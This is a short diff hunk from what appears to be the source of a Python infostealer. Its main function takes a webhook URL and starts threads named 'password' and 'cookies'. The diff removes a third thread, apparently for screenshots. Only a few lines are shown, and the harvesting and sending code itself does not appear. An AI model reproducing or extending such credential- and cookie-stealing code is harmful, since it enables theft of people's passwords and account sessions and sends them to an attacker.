@@ -43,7 +43,6 @@ def main(webhook_url):
 	
 	threads = []
 	for thread in [
-		Thread(target=ss),
 		Thread(target=password),
 		Thread(target=cookies),
 		]:
